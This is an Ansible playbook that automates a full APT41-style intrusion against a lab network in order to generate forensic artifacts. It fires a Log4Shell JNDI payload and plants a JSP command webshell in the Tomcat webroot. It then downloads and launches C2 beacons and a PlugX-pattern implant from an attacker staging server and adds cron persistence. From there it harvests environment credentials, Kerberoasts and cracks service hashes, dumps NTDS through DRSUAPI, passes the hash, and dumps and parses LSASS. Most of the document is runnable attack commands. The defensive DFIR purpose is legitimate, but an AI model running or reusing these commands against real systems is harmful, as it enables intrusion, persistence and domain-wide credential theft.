---
# Operation DragonRx — Automated Full Attack Simulation
# Purpose : DFIR artifact generation — real tools, real commands, full APT41 kill chain
# Run from : /home/andrey/dragonrx-lab/
# Usage   : ansible-playbook -i ansible/inventory/hosts.ini ansible/playbooks/attack.yml
#
# NETWORK MAP
#   10.0.0.5   / 192.168.10.5    kali        — dual-homed attacker
#   10.0.0.10                    sliver_c2   — C2 HTTP :80  HTTPS :443
#   10.0.0.20                    jndi        — marshalsec LDAP :1389
#   10.0.0.100 / 192.168.10.100  web01       — Tomcat 9 + log4j 2.14.1
#   192.168.10.10                DC01        — Windows Server 2019 (novatech.local DC)
#   192.168.10.20                FS01        — Windows Server 2019 (file server)
#   192.168.10.50                WS01        — Windows 10 22H2
#
# STAGING SERVER: Kali python3 http.server on port 8900 → /opt/tools/
#   Linux targets  → http://10.0.0.5:8900/<path>
#   Windows targets → http://192.168.10.5:8900/<path>  (target_net NIC)
#
# DC01 Sliver beacon: dc01_http.exe (HTTP→:80) — avoids HTTPS cert mismatch

# ============================================================================
# PREFLIGHT — verify lab is up before running attack
# ============================================================================

- name: "PREFLIGHT — verify lab is up"
  hosts: localhost
  gather_facts: false
  tasks:
    - name: "PRE | JNDI relay running"
      shell: |
        docker inspect dragonrx_jndi 2>/dev/null \
          | python3 -c "import sys,json; d=json.load(sys.stdin); print(str(d[0]['State']['Running']).lower())"
      register: jndi_state
      failed_when: "'true' not in jndi_state.stdout"

    - name: "PRE | Sliver C2 running"
      shell: |
        docker inspect dragonrx_c2 2>/dev/null \
          | python3 -c "import sys,json; d=json.load(sys.stdin); print(str(d[0]['State']['Running']).lower())"
      register: c2_state
      failed_when: "'true' not in c2_state.stdout"

    - name: "PRE | web01 HTTP responding"
      shell: |
        curl -sf --max-time 5 \
          -H 'X-Api-Version: preflight' \
          http://10.0.0.100:8080/ || true
      register: web01_check

    - name: "PRE | DC01 WinRM reachable"
      shell: nc -z -w3 192.168.10.10 5985 && echo reachable
      register: dc01_winrm
      ignore_errors: true

    - name: "PRE | WS01 WinRM reachable"
      shell: nc -z -w3 192.168.10.50 5985 && echo reachable
      register: ws01_winrm
      ignore_errors: true

    - name: "PRE | Preflight results"
      debug:
        msg:
          - "JNDI  : {{ jndi_state.stdout | trim }}"
          - "C2    : {{ c2_state.stdout | trim }}"
          - "DC01  : {{ dc01_winrm.stdout | default('unreachable') }}"
          - "WS01  : {{ ws01_winrm.stdout | default('unreachable') }}"

# ============================================================================
# PHASE 0 — Reconnaissance   ATT&CK: T1595.002, T1592.002
# ============================================================================

- name: "PHASE 0 — Reconnaissance"
  hosts: kali
  gather_facts: false
  tasks:
    - name: "P0 | Create loot directories"
      file:
        path: "{{ item }}"
        state: directory
        mode: "0755"
      loop:
        - /opt/loot
        - /opt/loot/recon

    - name: "P0.1 | nmap — service/version scan on web01:8080"
      shell: |
        nmap -sV -sC -p 8080 10.0.0.100 \
          -oA /opt/loot/recon/web01_scan 2>/dev/null
      ignore_errors: true

    - name: "P0.2 | whatweb — web technology fingerprint"
      shell: |
        whatweb http://10.0.0.100:8080 -v 2>/dev/null \
          | tee /opt/loot/recon/whatweb.txt
      ignore_errors: true

    - name: "P0.3 | Raw response headers — confirm JSON API + no Server header"
      shell: |
        curl -s -o /dev/null -D - http://10.0.0.100:8080/ \
          | grep -iE 'server|x-powered|content-type'
      register: headers
      ignore_errors: true

    - name: "P0.4 | Probe X-Api-Version header — confirm injection vector"
      shell: |
        curl -sv \
          -H 'X-Api-Version: recon-probe' \
          http://10.0.0.100:8080/ 2>&1 \
          | grep -E '< HTTP|Content-Type'
      ignore_errors: true

# ============================================================================
# PHASE 1 — Initial Access — Log4Shell CVE-2021-44228   ATT&CK: T1190
# ============================================================================

- name: "PHASE 1 — Initial Access (Log4Shell CVE-2021-44228)"
  hosts: localhost
  gather_facts: false
  tasks:
    - name: "P1.0 | Verify JNDI relay status"
      shell: docker logs dragonrx_jndi 2>&1 | tail -6
      register: jndi_ready

    - name: "P1.0 | Assert JNDI relay is listening"
      assert:
        that: "'Listening on' in jndi_ready.stdout or 'ldap' in jndi_ready.stdout | lower"
        fail_msg: "dragonrx_jndi not ready — run: docker compose up -d jndi_server"

    - name: "P1.1 | Start nc reverse shell listener on Kali (background — creates socket artifact)"
      shell: |
        docker exec -d dragonrx_kali bash -c \
          'nohup nc -lvnp 4444 >/tmp/revshell_output.txt 2>&1 &'
      ignore_errors: true

    - name: "P1.2 | Fire Log4Shell — inject JNDI lookup via X-Api-Version header"
      shell: |
        docker exec dragonrx_kali bash -c \
          'curl -s http://10.0.0.100:8080/ \
            -H "X-Api-Version: \${jndi:ldap://10.0.0.20:1389/Exploit}" \
            --max-time 8 || true'
      # DFIR: Tomcat access.log — GET / with ${jndi:ldap://...} in X-Api-Version
      # DFIR: LDAP conn from web01 → dragonrx_jndi:1389
      # DFIR: HTTP GET web01 → dragonrx_jndi:8080/Exploit.class
      # DFIR: Process event — java spawning /bin/bash (Wazuh CRITICAL)
      # DFIR: Zeek http.log — JNDI string in header (Zeek CRITICAL)

    - name: "P1.3 | Wait — JVM downloads + executes Exploit.class, bash spawns"
      pause:
        seconds: 6

    - name: "P1.4 | Confirm JNDI relay received callback"
      shell: docker logs dragonrx_jndi 2>&1 | tail -6
      register: jndi_callback

    - debug:
        msg: "JNDI callback: {{ jndi_callback.stdout_lines }}"

    - name: "P1.5 | Kill nc listener — webshell replaces fragile reverse shell"
      shell: |
        docker exec dragonrx_kali bash -c \
          'pkill -f "nc -lvnp 4444" 2>/dev/null || true'
      ignore_errors: true

# ============================================================================
# PHASE 2 — Foothold: Webshell + Sliver Beacon + RxPhage
# ATT&CK: T1505.003, T1059.004, T1053.003
# ============================================================================

- name: "PHASE 2a — Deploy JSP Webshell on web01"
  hosts: web01
  gather_facts: false
  tasks:
    - name: "P2.1 | Create plausible static resource directory path"
      file:
        path: /opt/tomcat/webapps/ROOT/resources/imgs
        state: directory
        mode: "0755"

    - name: "P2.2 | Write China Chopper-pattern JSP webshell"
      copy:
        dest: /opt/tomcat/webapps/ROOT/resources/imgs/cache.jsp
        mode: "0644"
        content: |
          <%@page import="java.util.*,java.io.*"%><%
          String cmd = request.getParameter("c");
          if(cmd != null && !cmd.isEmpty()) {
              Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
              BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
              StringBuilder sb = new StringBuilder();
              String line;
              while((line = br.readLine()) != null) sb.append(line).append("\n");
              out.print(sb.toString());
          }
          %>
      # DFIR: Wazuh file-integrity alert — JSP created in Tomcat webroot (HIGH)

- name: "PHASE 2b — Start C2 listeners + staging + deploy implants"
  hosts: localhost
  gather_facts: false
  vars:
    webshell: "http://10.0.0.100:8080/resources/imgs/cache.jsp"
  tasks:
    - name: "P2.3 | Ensure Sliver HTTP listener is running (port 80)"
      shell: |
        docker exec -i dragonrx_c2 bash -c "
          CFG=\$(ls /root/.sliver-client/configs/*.cfg 2>/dev/null | head -1)
          printf 'http --lhost 0.0.0.0 --lport 80\nexit\n' \
            | /usr/local/bin/sliver --config \"\$CFG\" 2>&1 | tail -5 || true
        "
      ignore_errors: true

    - name: "P2.4 | Ensure Sliver HTTPS listener is running (port 443)"
      shell: |
        docker exec -i dragonrx_c2 bash -c "
          CFG=\$(ls /root/.sliver-client/configs/*.cfg 2>/dev/null | head -1)
          printf 'https --lhost 0.0.0.0 --lport 443\nexit\n' \
            | /usr/local/bin/sliver --config \"\$CFG\" 2>&1 | tail -5 || true
        "
      ignore_errors: true

    - name: "P2.5 | Start staging HTTP server on Kali (port 8900 → /opt/tools/)"
      shell: |
        docker exec dragonrx_kali bash -c '
          fuser -k 8900/tcp 2>/dev/null || true
          sleep 1
          nohup python3 -m http.server 8900 --directory /opt/tools/ \
            >/tmp/staging.log 2>&1 &
          sleep 2
          pgrep -f "http.server 8900" && echo STAGING_OK
        '
      register: staging_start
      failed_when: "'STAGING_OK' not in staging_start.stdout"

    - name: "P2.6 | Confirm webshell responds"
      shell: |
        curl -sf "{{ webshell }}" --data-urlencode "c=id" --max-time 5 \
          || echo WEBSHELL_NOT_RESPONDING
      register: webshell_probe

    - debug:
        msg: "Webshell: {{ webshell_probe.stdout }}"

    - name: "P2.7 | Download Sliver HTTP beacon via webshell (JVM spawns wget — DFIR artifact)"
      shell: |
        curl -s "{{ webshell }}" --max-time 30 \
          --data-urlencode \
          'c=mkdir -p /tmp/.cache && wget -q http://10.0.0.5:8900/rxphage/dragonrx_beacon -O /tmp/.cache/dragonrx_beacon && chmod +x /tmp/.cache/dragonrx_beacon && echo BEACON_DOWNLOADED'
      register: beacon_dl
      failed_when: "'BEACON_DOWNLOADED' not in beacon_dl.stdout"
      # DFIR: Tomcat access.log — GET /resources/imgs/cache.jsp?c=wget... (HIGH)
      # DFIR: Wazuh — Tomcat spawning wget from /tmp

    - name: "P2.8 | Launch Sliver beacon on web01 (nohup — detached from webshell session)"
      shell: |
        curl -s "{{ webshell }}" --max-time 15 \
          --data-urlencode \
          'c=nohup /tmp/.cache/dragonrx_beacon >/dev/null 2>&1 & sleep 2 && pgrep -f dragonrx_beacon && echo BEACON_RUNNING'
      register: beacon_launch
      # DFIR: Wazuh — executable launched from /tmp (HIGH)
      # DFIR: Zeek conn.log — outbound HTTP to 10.0.0.10:80 every 30s

    - name: "P2.9 | Deploy RxPhage implant (PlugX-pattern) + cron @reboot persistence"
      shell: |
        curl -s "{{ webshell }}" --max-time 30 \
          --data-urlencode \
          'c=wget -q http://10.0.0.5:8900/rxphage/rxphage -O /tmp/.cache/rxphage && chmod +x /tmp/.cache/rxphage && (crontab -l 2>/dev/null; echo "@reboot /tmp/.cache/rxphage") | crontab - && nohup /tmp/.cache/rxphage >/dev/null 2>&1 & echo RXPHAGE_DEPLOYED'
      register: rxphage_deploy
      # DFIR: Zeek dns.log — NXDOMAIN for updates.oracle-cdn.com (MEDIUM)

    - name: "P2.10 | Wait for Sliver beacon initial check-in"
      pause:
        seconds: 36

    - name: "P2.11 | Confirm beacon registered in Sliver"
      shell: |
        docker exec -i dragonrx_c2 bash -c "
          CFG=\$(ls /root/.sliver-client/configs/*.cfg 2>/dev/null | head -1)
          printf 'beacons\nexit\n' \
            | /usr/local/bin/sliver --config \"\$CFG\" 2>&1
        "
      register: sliver_beacons
      ignore_errors: true

    - debug:
        msg: "Sliver beacons: {{ sliver_beacons.stdout_lines }}"

    - name: "P2.12 | Verify both implants running on web01"
      shell: |
        curl -s "{{ webshell }}" --max-time 10 \
          --data-urlencode 'c=ps aux | grep -E "dragonrx_beacon|rxphage" | grep -v grep'
      register: implants_ps

    - debug:
        msg: "Running implants: {{ implants_ps.stdout_lines }}"

# ============================================================================
# PHASE 3 — Discovery
# ATT&CK: T1046, T1082, T1087.002, T1069.002, T1552.001
# ============================================================================

- name: "PHASE 3 — Discovery"
  hosts: localhost
  gather_facts: false
  vars:
    webshell: "http://10.0.0.100:8080/resources/imgs/cache.jsp"
  tasks:
    - name: "P3.1 | Host info — id, hostname, uname (via webshell)"
      shell: |
        curl -s "{{ webshell }}" --max-time 10 \
          --data-urlencode 'c=id; whoami; hostname; uname -a; head -3 /etc/os-release'
      register: host_info

    - name: "P3.2 | Network interfaces — confirm dual-homed eth0+eth1"
      shell: |
        curl -s "{{ webshell }}" --max-time 10 \
          --data-urlencode 'c=ip addr show'
      register: net_ifaces

    - name: "P3.3 | Routing table — discover 192.168.10.0/24 internal segment"
      shell: |
        curl -s "{{ webshell }}" --max-time 10 \
          --data-urlencode 'c=ip route show'
      register: routes

    - name: "P3.4 | Active connections (what is web01 already talking to)"
      shell: |
        curl -s "{{ webshell }}" --max-time 10 \
          --data-urlencode 'c=ss -antup | grep -v 127.0.0.1'
      register: connections

    - name: "P3.5 | /proc/1/environ — credential discovery in JVM environment (T1552.001)"
      shell: |
        curl -s "{{ webshell }}" --max-time 10 \
          --data-urlencode 'c=cat /proc/1/environ | tr "\0" "\n" | sort'
      register: environ_dump
      # CRITICAL: LDAP_USER=svc_ldap / LDAP_PASS=NovaTech2021! in plain text

    - name: "P3.5 | Discovered credentials from environment"
      debug:
        msg: "{{ environ_dump.stdout_lines | select('match', '.*(LDAP|DOMAIN|PASS|CRED).*') | list }}"

    - name: "P3.6 | Internal network ping sweep — 192.168.10.0/24 (T1046)"
      shell: |
        curl -s "{{ webshell }}" --max-time 120 \
          --data-urlencode 'c=for i in $(seq 1 254); do (ping -c 1 -W 1 192.168.10.$i &>/dev/null && echo 192.168.10.$i UP) & done; wait'
      register: ping_sweep
      ignore_errors: true
      # DFIR: Zeek conn.log — sequential ICMP from 192.168.10.100 (MEDIUM)

    - name: "P3.6 | Live hosts"
      debug:
        msg: "{{ ping_sweep.stdout_lines | select('match', '.*UP') | list }}"

    - name: "P3.7 | Port scan Windows targets from Kali — map services (T1046)"
      shell: |
        docker exec dragonrx_kali bash -c \
          'nmap -sV -p 135,139,389,445,636,3389,5985,5986 \
           192.168.10.10 192.168.10.20 192.168.10.50 2>/dev/null \
           | tee /opt/loot/recon/windows_portscan.txt'
      register: nmap_win
      ignore_errors: true

    - name: "P3.8 | Enumerate domain users via GetADUsers (T1087.002)"
      shell: |
        docker exec dragonrx_kali bash -c \
          'impacket-GetADUsers novatech.local/svc_ldap:"NovaTech2021!" \
           -dc-ip 192.168.10.10 -all 2>/dev/null \
           | tee /opt/loot/recon/domain_users.txt'
      register: ldap_users
      ignore_errors: true

    - name: "P3.9 | LDAP — find Kerberoastable accounts (SPN-registered) (T1069.002)"
      shell: |
        docker exec dragonrx_kali bash -c \
          'ldapsearch -x \
            -H ldap://192.168.10.10 \
            -D svc_ldap@novatech.local \
            -w "NovaTech2021!" \
            -b dc=novatech,dc=local \
            "(&(objectClass=user)(servicePrincipalName=*))" \
            sAMAccountName servicePrincipalName memberOf 2>/dev/null \
            | grep -E "^sAMAccountName|^servicePrincipalName|^memberOf"'
      register: spn_users
      ignore_errors: true

    - name: "P3.9 | Kerberoastable accounts"
      debug:
        msg: "{{ spn_users.stdout_lines }}"

    - name: "P3.10 | LDAP — enumerate Domain Admins group (T1087.002)"
      shell: |
        docker exec dragonrx_kali bash -c \
          'ldapsearch -x \
            -H ldap://192.168.10.10 \
            -D svc_ldap@novatech.local \
            -w "NovaTech2021!" \
            -b "cn=Domain Admins,cn=Users,dc=novatech,dc=local" \
            member 2>/dev/null | grep "^member:"'
      register: domain_admins
      ignore_errors: true

    - name: "P3.10 | Domain Admins"
      debug:
        msg: "{{ domain_admins.stdout_lines }}"

# ============================================================================
# PHASE 4 — Credential Access
# ATT&CK: T1558.003, T1003.001, T1003.003
# ============================================================================

- name: "PHASE 4 — Credential Access"
  hosts: kali
  gather_facts: false
  tasks:
    - name: "P4.1 | Kerberoast — request TGS for SPN-registered accounts (T1558.003)"
      shell: |
        impacket-GetUserSPNs \
          novatech.local/svc_ldap:'NovaTech2021!' \
          -dc-ip 192.168.10.10 \
          -request \
          -outputfile /opt/loot/kerberoast_hashes.txt 2>&1
      register: kerberoast_out
      ignore_errors: true
      # DFIR: Windows EID 4769 — Kerberos TGS requested for svc_backup (MEDIUM)

    - debug:
        msg: "{{ kerberoast_out.stdout_lines }}"

    - name: "P4.2 | Crack Kerberoast hash with john (krb5-18 = AES256)"
      shell: |
        gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
        john /opt/loot/kerberoast_hashes.txt \
          --wordlist=/usr/share/wordlists/rockyou.txt \
          --format=krb5-18 2>&1
        echo "=== cracked ==="
        john /opt/loot/kerberoast_hashes.txt --show --format=krb5-18 2>&1
      register: john_out
      ignore_errors: true

    - name: "P4.2 | Cracked password"
      debug:
        msg: "{{ john_out.stdout_lines }}"

    - name: "P4.3 | Verify svc_backup can authenticate to DC01"
      shell: |
        nxc smb 192.168.10.10 \
          -u svc_backup \
          -p 'Backup_Svc99!' 2>&1
      register: svc_backup_auth
      ignore_errors: true

    - name: "P4.4 | NTDS dump via secretsdump DRSUAPI — all domain hashes (T1003.003)"
      shell: |
        impacket-secretsdump \
          novatech.local/svc_backup:'Backup_Svc99!'@192.168.10.10 \
          -just-dc \
          > /opt/loot/ntds_dump.txt 2>&1
      register: secretsdump_run
      ignore_errors: true
      # DFIR: EID 4662 — DRSUAPI replication from non-DC (HIGH)
      # DFIR: Wazuh Behavior:Win32/RegDump.SA / RemoteRegDump.A on DC01

    - name: "P4.5 | Extract Administrator NTLM hash"
      shell: |
        grep "^Administrator:" /opt/loot/ntds_dump.txt | cut -d: -f4
      register: admin_ntlm
      ignore_errors: true

    - name: "P4.5 | Extract krbtgt hash (Golden Ticket capability)"
      shell: |
        grep "^krbtgt:" /opt/loot/ntds_dump.txt | cut -d: -f4
      register: krbtgt_ntlm
      ignore_errors: true

    - name: "P4.5 | Save Administrator NTLM hash to loot"
      copy:
        content: "{{ admin_ntlm.stdout | trim }}"
        dest: /opt/loot/admin_ntlm.txt
      when: admin_ntlm.stdout | trim | length > 0

    - name: "P4.5 | Credential summary"
      debug:
        msg:
          - "Administrator NTLM : {{ admin_ntlm.stdout | trim }}"
          - "krbtgt NTLM        : {{ krbtgt_ntlm.stdout | trim }}"

    - name: "P4.6 | LSASS dump on WS01 via comsvcs MiniDump + smbexec (T1003.001)"
      shell: |
        NTLM=$(cat /opt/loot/admin_ntlm.txt)
        nxc smb 192.168.10.50 \
          -u administrator \
          -H "aad3b435b51404eeaad3b435b51404ee:${NTLM}" \
          --exec-method smbexec \
          -x 'powershell -ep bypass -c "$l=(Get-Process lsass).Id; rundll32 C:\Windows\System32\comsvcs.dll,MiniDump $l C:\Temp\lsass.dmp full; Start-Sleep 3"' \
          2>&1
      register: lsass_dump_run
      ignore_errors: true
      # DFIR: Sysmon EID 10 — ProcessAccess: rundll32.exe → lsass.exe (CRITICAL)

    - name: "P4.6 | Wait for LSASS dump to flush"
      pause:
        seconds: 8

    - name: "P4.7 | Download LSASS dump from WS01 via smbclient"
      shell: |
        cd /opt/loot && \
        smbclient //192.168.10.50/C$ \
          -U 'NOVATECH/Administrator%NovaTech_Admin2024!' \
          -c 'cd Temp; get lsass.dmp' 2>&1
      register: lsass_dl
      ignore_errors: true

    - name: "P4.8 | Parse LSASS dump with pypykatz — extract NTLM hashes"
      shell: |
        pypykatz lsa minidump /opt/loot/lsass.dmp 2>/dev/null \
          | grep -A 8 "== MSV ==" | head -30
      register: pypykatz_out
      ignore_errors: true

    - name: "P4.8 | pypykatz output"
      debug:
        msg: "{{ pypykatz_out.stdout_lines }}"

